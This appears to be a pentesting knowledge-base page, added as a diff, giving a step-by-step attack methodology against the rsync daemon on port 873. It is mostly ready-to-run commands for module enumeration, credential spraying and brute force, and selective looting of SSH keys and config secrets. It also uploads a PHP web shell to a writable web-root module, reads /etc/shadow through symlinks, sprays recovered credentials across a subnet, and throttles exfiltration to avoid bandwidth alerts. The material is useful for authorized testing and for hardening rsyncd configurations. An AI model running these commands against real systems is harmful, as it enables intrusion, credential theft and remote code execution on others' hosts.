@@ -1,0 +1,378 @@
+---
+title: Rsync - Port 873
+description: Enumeration and attack methodology for the rsync daemon on port 873, covering module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging.
+openGraph:
+  title: "Rsync - Port 873"
+  description: "Enumeration and attack methodology for the rsync daemon on port 873, covering module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
+  images:
+    - url: /imgs/rsync.jpg
+      width: 1672
+      height: 941
+      alt: Rsync - Port 873
+      type: image/jpeg
+twitter:
+  card: summary_large_image
+  title: "Rsync - Port 873"
+  description: "Enumeration and attack methodology for the rsync daemon on port 873, covering module discovery, anonymous access, credential attacks, selective looting, writable-module RCE, and credential pillaging."
+  images:
+    - url: /imgs/rsync.jpg
+      width: 1672
+      height: 941
+      alt: Rsync - Port 873
+      type: image/jpeg
+---
+
+# Rsync - Port 873
+
+import { Callout } from 'nextra/components'
+
+## Cheatsheet
+
+```bash
+nmap -sV -sC -p873 <IP>
+nmap --script rsync-list-modules -p873 <IP>
+
+# interact
+# format:`[rsync://][user@]host[:port]/module.``
+rsync rsync://<IP>/
+rsync --list-only rsync://<IP>/     # list modules
+rsync -av --list-only rsync://<IP>/<MODULE>/ #module's contents
+
+# Download (mirror) an entire module
+rsync -av rsync://<IP>/<MODULE>/ ./loot/
+
+# Resume large/unstable pulls
+rsync -avzP --partial --append rsync://<IP>/<MODULE>/ ./loot/
+
+# Upload (write test)
+rsync -av ./test.txt rsync://<IP>/<MODULE>/
+
+# Brute force a module (NSE)
+nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>" -p873 <IP>
+```
+
+## Methodology
+
+### Phase 1: Module Enumeration
+
+<Callout type="default" emoji="?">
+  ** Ask yourself**
+
+  - What protocol version does the daemon greet with, and which modules does it advertise?
+  - Do the NSE script and the rsync client agree on the module list?
+  - What do the module *names and descriptions* imply about their contents?
+  - Which modules look restricted (named for internal/secret use) versus public, and which deserve credential effort first?
+  - Can I enumerate without the rsync client if I am on a stripped jump box?
+</Callout>
+
+```bash
+
+nmap -sV -sC -p873 <IP>
+nmap --script rsync-list-modules -p873 <IP>
+rsync --list-only rsync://<IP>/
+# Manual enumeration with no rsync client installed
+nc -nv <IP> 873   # then: @RSYNCD: 31.0  /  #list
+```
+
+- [ ] `nmap -sV -sC -p873 <IP>` confirm rsyncd and capture the banner. The greeting includes the protocol version (e.g. `@RSYNCD: 31.0`).
+- [ ] `nmap --script rsync-list-modules -p873 <IP>` enumerates every advertised module name plus description. The single highest-value rsync recon command.
+- [ ] `rsync --list-only rsync://<IP>/` equivalent enumeration via the client. Run both; they occasionally disagree on filtered or non-default configs.
+- [ ] `nc -nv <IP> 873` then send `@RSYNCD: 31.0` and `#list` manual enumeration when rsync is not installed locally.
+- [ ] Read every module name/description carefully names like `backup`, `home`, `www`, `dev`, `etc`, `secret`, `keys` are intelligence in themselves, and each implies a different target.
+
+<Callout type="info">
+**Prioritise from the names.** If a listing returns `backup`, `www`, and `internal` but anonymous access works only on `www`, the other two carry an `auth users` directive. An open `www` is often a "sync the website" task the admin never tightened, while a name like `internal` or `secret` is exactly what admins use for content they do not want found  frequently worth far more than the open module. Queue the restricted, high-value names for credential attacks in Phase 3, not just the ones that open freely.
+</Callout>
+
+### Phase 2: Anonymous Access Validation
+
+<Callout type="default" emoji="?">
+  ** Ask yourself**
+
+  - For each module, does anonymous read succeed, fail auth, get host-denied, or error on chroot?
+  - Does the trailing slash change whether I list the module or a single file?
+  - Are there common module names worth trying blind even if not advertised?
+  - Which modules go onto the credential-attack queue for Phase 3?
+</Callout>
+
+```bash
+rsync -av --list-only rsync://<IP>/<MODULE>/
+# Try common names blind even if not advertised
+for m in backup public data files shared share home www web etc config srv mirror pub; do
+  echo "== $m =="; rsync -av --list-only "rsync://<IP>/$m/" 2>&1 | head
+done
+```
+
+- [ ] For every module: `rsync -av --list-only rsync://<IP>/<MODULE>/`. The trailing slash matters without it rsync lists *the module itself*; with it, the module is enumerated as a directory.
+- [ ] Interpret the response: success → loot it (Phase 4); `@ERROR: auth failed on module <NAME>` → credentials required, queue for Phase 3; `@ERROR: access denied ... from <YOUR_IP>` → `hosts allow`/`deny` filter, may be bypassable from a different pivot; `@ERROR: chroot failed` → misconfigured path, but the module's existence is confirmed.
+- [ ] Try common modules blind even if unadvertised: `backup`, `public`, `data`, `files`, `shared`, `share`, `home`, `www`, `web`, `etc`, `config`, `srv`, `mirror`, `pub`.
+
+### Phase 3: Credential Attacks
+
+<Callout type="default" emoji="?">
+  ** Ask yourself**
+
+  - Which credentials harvested elsewhere should I spray first (reuse before brute force)?
+  - Does the module authenticate a daemon-local user (from the secrets file) rather than a system account?
+  - Is a targeted spray enough, or do I need the NSE brute forcer?
+  - Am I in a MITM position to capture the MD5 challenge/response for offline cracking?
+</Callout>
+
+```bash
+# Spray harvested credentials first (reuse beats brute force)
+for u in $(cat users.txt); do for p in $(cat passwords.txt); do
+  RSYNC_PASSWORD="$p" rsync --list-only "rsync://${u}@<IP>/<MODULE>" 2>/dev/null && echo "[+] $u:$p"
+done; done
+
+# NSE brute force
+nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>,brute.firstonly=true" -p873 <IP>
+
+# Capture the MD5 challenge/response if you can sniff (offline cracking)
+sudo tcpdump -nn -A -i <IFACE> 'tcp port 873'
+```
+
+- [ ] Spray harvested credentials against any module that returned `auth failed` credential reuse is the highest-probability path. Use the shell loop above or a wordlist.
+- [ ] `nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>" -p873 <IP>` built-in brute force; faster and cleaner than a shell loop. `brute.firstonly=true` stops at the first hit.
+- [ ] Hydra also has an rsync module (`hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rsync://<IP>/<MODULE>`) but it is brittle prefer the NSE script.
+- [ ] rsyncd authentication is an MD5-based challenge-response over cleartext. In a MITM position, capture the pair with `tcpdump` and crack it offline.
+
+<Callout type="warning">
+**OPSEC:** Repeated `auth failed` entries are logged by rsyncd (`rsyncd[PID]: auth failed on module <NAME>`) and trip brute-force alerts on more than a few failures in a short window. Spray a small, targeted credential set before falling back to the NSE brute forcer.
+</Callout>
+
+### Phase 4: Loot Strategy List First, Pull Selectively
+
+<Callout type="default" emoji="?">
+  ** Ask yourself**
+
+  - How large is the module is a full mirror realistic, or will it be slow and loud?
+  - Which high-value files can I identify from the listing without downloading anything?
+  - What is the smallest pull that gets the credentials/keys I need?
+  - Will a full mirror trigger bandwidth/flow alerting?
+</Callout>
+
+```bash
+# Always list recursively first the listing is tiny, the data is not
+rsync -av --list-only rsync://<IP>/<MODULE>/ | tee module-listing.txt
+
+# Pull only the high-value paths
+rsync -avzP rsync://<IP>/<MODULE>/path/to/secret ./
+rsync -avzP --include='*/' --include='id_*' --include='*.key' --include='*.conf' --exclude='*' \
+      rsync://<IP>/<MODULE>/ ./loot/
+
+# Then grep what you pulled
+grep -riIE "password|passwd|secret|api[_-]?key|token|aws_access|database_url|connection.?string" ./loot/
+```
+
+- [ ] List recursively first: `rsync -av --list-only rsync://<IP>/<MODULE>/`. Produces a full file tree with sizes/timestamps for the cost of a tiny transfer. Save it.
+- [ ] From the listing, pick high-value targets without downloading: SSH material (`id_rsa`, `id_ed25519`, `*.pem`, `*.key`, `*.ppk`, `authorized_keys`, `known_hosts`); configs (`*.conf`, `*.env`, `*.yaml`, `wp-config.php`, `web.config`, `settings.py`); history (`.bash_history`, `.psql_history`, `.mysql_history`); scripts (`*.sh`, `*.ps1`, `*.py`); secret stores (`*.kdbx`, `password*`, `secret*`); backups (`*.bak`, `*.tar*`, `*.sql*`); VCS (`.git/config`, `.git-credentials`).
+- [ ] Pull only those paths with `--include`/`--exclude`, then `grep -riIE` the loot for credentials.
+
+<Callout type="warning">
+**OPSEC:** Anonymous listings look like normal sync clients. A full mirror of a `home` or `backup` module is loud and shows up as a bandwidth spike in any flow-monitored environment. List first, hand-pick the 5–10 files that matter, and pull only those.
+</Callout>
+
+### Phase 5: Write Access Check
+
+<Callout type="default" emoji="?">
+  ** Ask yourself**
+
+  - Is the module writable (`read only = no`), and which subpaths accept writes?
+  - What does the writable path map to on disk web root, home dir, cron-watched dir, service binary location?
+  - Is `use chroot = no` set, enabling a symlink-based filesystem read?
+  - What is the smallest, most-disposable payload that converts write access into access I want?
+</Callout>
+
+```bash
+# Instant read-only vs writable feedback
+rsync -av ./test.txt rsync://<IP>/<MODULE>/
+
+# Web root mapping -> instant RCE (verify with a canary first)
+echo canary > canary.html && rsync -av canary.html rsync://<IP>/<MODULE>/
+# then browse http://<IP>/canary.html ; if it renders, drop a shell:
+echo '<?php system($_GET["c"]); ?>' > sh.php && rsync -av sh.php rsync://<IP>/<MODULE>/
+
+# use chroot = no -> symlink filesystem read primitive
+ln -s /etc/shadow shadow_link
+rsync -av ./shadow_link rsync://<IP>/<MODULE>/
+rsync -av rsync://<IP>/<MODULE>/shadow_link ./
+```
+
+- [ ] `rsync -av ./test.txt rsync://<IP>/<MODULE>/`  instant write success, or "permission denied / read only".
+- [ ] If writable, the value depends on what the path maps to: web root (`/var/www/html`, `/srv/http`) → upload web shell → RCE; user home (`/home/<user>`) → drop `.ssh/authorized_keys` → SSH as that user ssh; cron-watched dir (`/etc/cron.*`, `/var/spool/cron`) → script execution as the cron owner; service binary path (`/usr/local/bin`, `/opt/<app>/bin`) → replace a privileged binary.
+- [ ] Module names rarely reveal the underlying path  verify with a canary upload before dropping a real payload.
+- [ ] If `use chroot = no`, plant a symlink to an out-of-module file and read it back  a full filesystem read primitive for any file the daemon UID can reach.
+
+### Phase 6: Pivot from Loot to Lateral Movement
+
+<Callout type="default" emoji="?">
+  ** Ask yourself**
+
+  - Which recovered credentials and keys apply to which services and hosts?
+  - For each SSH key, which `(user, host)` pairs should I try beyond the obvious owner?
+  - Are there more rsync hosts on the subnet sharing the same admin's misconfigurations?
+  - Do database backups contain crackable hashes or live-reusable credentials?
+</Callout>
+
+```bash
+# Spray every recovered credential across the scope
+nxc ssh <IP> -u users.txt -p passwords.txt --continue-on-success
+nxc smb <SUBNET>/24 -u <USER> -p <PASS> --continue-on-success
+# Reuse a recovered SSH key against every known username
+chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>
+# Sweep the subnet for more rsync hosts (same admin, same config)
+nmap -p873 --open <SUBNET>/24
+```
+
+- [ ] Spray every credential extracted from rsync against SSH, SMB, WinRM, RDP, FTP, databases, and web admin panels credential reuse is the point of this phase.
+- [ ] Use any SSH key found: `chmod 600 id_rsa && ssh -i id_rsa <USER>@<IP>`, trying every discovered username, not just the directory it came from ssh.
+- [ ] `nmap -p873 --open <SUBNET>/24` where there is one open rsync there are usually more, with the same default config.
+- [ ] Database backups (`*.sql`, `*.sql.gz`, `*.bak`) often contain hashes to crack offline and credentials that work against the live database.
+
+
+<Quiz
+  question="You discover an rsync module called 'website' with read only = no (anonymous write works). Its contents match a WordPress install. What is the highest-priority action?"
+  options={[
+    "Upload a PHP web shell if the module maps to the live web root, that is instant RCE",
+    "Download all existing files first to fingerprint the WordPress version and look for vulnerable plugins",
+    "Plant a malicious .htaccess to hijack URL routing for credential capture",
+    "Scan the rest of the subnet for additional rsync hosts before touching this one"
+  ]}
+  answer={0}
+  explanation="A writable rsync module mapped to a web root is instant RCE drop a one-line PHP web shell, browse to the corresponding URL, and execute as the web server user. Verify the mapping first with a quick canary upload (rsync -av canary.html rsync://<IP>/website/ then browse for it). Downloading first (B) is something you do eventually, but the WordPress version is irrelevant when you can run arbitrary code without exploiting any plugin. The .htaccess hijack (C) is clever but indirect RCE outranks credential capture. Scanning more hosts (D) is a delay tactic when a confirmed vulnerability is in front of you. Always cash in confirmed RCE before pursuing more recon."
+/>
+
+## Overview
+
+Rsync is a fast, delta-encoding file-synchronization tool. It has two transport modes that share the same client binary but have very different security profiles.
+
+| Mode | Port | Auth | Encryption | Notes |
+|------|------|------|------------|-------|
+| **rsyncd daemon** | 873/TCP | Per-module, MD5 challenge | None (cleartext) | The classic exposure what this note covers |
+| **rsync over SSH** | 22/TCP | SSH (key or password) | SSH session | Inherits SSH security; default for command-line transfers |
+
+| Detail | Value |
+|--------|-------|
+| Daemon binary | `/usr/bin/rsync --daemon` |
+| Daemon config | `/etc/rsyncd.conf` |
+| Secrets file | `/etc/rsyncd.secrets` (`username:password` pairs, mode 600) |
+| Default log | Syslog, or `log file = /var/log/rsyncd.log` if configured |
+| Protocol versions | 30 (rsync 3.0+), 31 (rsync 3.1+) current |
+
+<Callout type="info">
+This note covers the rsyncd daemon (port 873) specifically  the attack surface that exists because rsync is running as a network service. When you find port 873 open, you are looking at rsyncd.
+</Callout>
+
+## Quick Reference
+
+```cmd
+nmap -sV -sC -p873 <IP>                     # Service scan: detect version and scripts
+nmap --script rsync-list-modules -p873 <IP> # List modules (NSE): enumerate modules with nmap
+rsync --list-only rsync://<IP>/             # List modules (client): show modules via rsync client
+nc -nv <IP> 873                             # Banner grab: connect and grab banner
+rsync -av --list-only rsync://<IP>/<MODULE>/ # List module contents: show files in module
+RSYNC_PASSWORD='<PASS>' rsync --list-only rsync://<USER>@<IP>/<MODULE> # List with auth: show contents as user
+rsync -av rsync://<IP>/<MODULE>/ ./loot/    # Mirror module: download everything in module
+rsync -avzP --include='*.key' --exclude='*' rsync://<IP>/<MODULE>/ ./keys/ # Selective pull: download .key files only
+rsync -avzP --partial --append rsync://<IP>/<MODULE>/ ./loot/ # Resume large pull: continue interrupted download
+rsync -av ./test.txt rsync://<IP>/<MODULE>/ # Upload (write test): try to upload file
+nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>" -p873 <IP> # Brute force module: brute force creds
+```
+
+## rsyncd Configuration
+
+`/etc/rsyncd.conf` defines global daemon options at the top and one section per module. The security posture of each module comes down to a handful of directives.
+
+```ini
+# Global section
+uid = nobody
+gid = nogroup
+use chroot = yes
+max connections = 10
+log file = /var/log/rsyncd.log
+
+[backup]
+    path = /srv/backup
+    read only = yes
+    auth users = backupuser
+    secrets file = /etc/rsyncd.secrets
+    hosts allow = 10.0.0.0/24
+
+[public]
+    path = /srv/public
+    read only = yes
+    # No auth users -> anonymous access
+
+[dev]
+    path = /home/dev/code
+    read only = no
+    # Writable + anonymous + maps to a home dir -> multiple attack chains
+```
+
+### Dangerous Settings
+
+| Directive | Risk | Why It Matters |
+|-----------|------|----------------|
+| No `auth users` directive | Anonymous access | The most common rsync misconfiguration |
+| `read only = no` | Write access | Upload web shells, plant `authorized_keys`, replace cron scripts |
+| `list = yes` (with no auth) | Module discoverability | Lets attackers enumerate every share before attempting access |
+| `use chroot = no` | Path traversal | Symlinks within the module can point outside it |
+| Missing `hosts allow` | No source restriction | Anyone reachable on the port can connect |
+| `path = /` | Entire filesystem exposed | Catastrophic  full root read if combined with anonymous access |
+| `uid = root` | Daemon runs as root | Reads any file regardless of filesystem permissions |
+| Secrets file mode > 600 | Local credential exposure | Any local user can read every rsyncd password |
+| `transfer logging = no` | No audit trail | Successful exfiltration leaves no daemon-side record |
+
+### `use chroot = no` Path Traversal
+
+With `use chroot = yes` (the default), rsyncd `chroot()`s into the module path and cannot serve files outside it. Set to `no`, the daemon runs in its parent's filesystem view and *symlinks within the module can point outside it*. Combined with anonymous access this is a full filesystem read primitive (see the symlink commands in Phase 5). Rare in modern Debian/Ubuntu installs (which default to `yes`) but common on appliances and NAS firmware where an admin disabled chroot to make a path work.
+
+## NSE Scripts
+
+```bash
+# List every advertised module
+nmap --script rsync-list-modules -p873 <IP>
+
+# Brute force credentials against a specific module
+nmap --script rsync-brute --script-args "rsync-brute.module=<MODULE>,brute.firstonly=true" -p873 <IP>
+
+# All rsync scripts at once
+nmap --script "rsync-*" -p873 <IP>
+```
+
+`brute.firstonly=true` stops at the first successful credential useful when you only need one valid pair to validate the module.
+
+## Rsync as a File Transfer Tool (Post-Exploitation)
+
+Rsync over SSH is the most operationally pleasant Linux file-transfer tool: it compresses, resumes, preserves permissions/timestamps, and inherits SSH's encryption all without any extra service on the target beyond standard SSH.
+
+```bash
+# Pull a directory tree from a compromised host to the attacker
+rsync -avzP -e "ssh -i id_rsa" <USER>@<TARGET_IP>:/home/<USER>/ ./loot/
+
+# Push tools to the compromised host
+rsync -avzP -e "ssh -i id_rsa" ./linpeas.sh <USER>@<TARGET_IP>:/tmp/
+
+# Resume a half-finished transfer (works both directions)
+rsync -avzP --partial --append -e ssh <USER>@<TARGET_IP>:/var/backups/db.sql.gz ./
+
+# Compression + bandwidth limit (stay under flow-monitoring thresholds)
+rsync -avzP --bwlimit=512 -e ssh <USER>@<TARGET_IP>:/loot/ ./
+```
+
+| Flag | Purpose |
+|------|---------|
+| `-a` | Archive mode (`-rlptgoD`) recursive, links, perms, times, group, owner, devices |
+| `-z` | Compression significant for text/config, negligible for already-compressed archives |
+| `-P` | `--partial --progress` resume + progress |
+| `--bwlimit=KBYTES` | Throttle to avoid bandwidth alerts |
+| `--include` / `--exclude` | Selective transfers (combine `--include` with `--exclude='*'`) |
+| `-e ssh` | Use SSH as the transport |
+
+<Callout type="info">
+On a compromised host, `rsync -avzP -e ssh` beats `scp` for any non-trivial transfer scp does not resume, does not compress automatically, and aborts on disconnect. Rsync's incremental/resume capabilities are critical for large pillaging across unstable links.
+</Callout>
+
+<div className="flex flex-wrap gap-2 mb-4">
+  #pentesting #redteam #linux #rsync 
+</div>
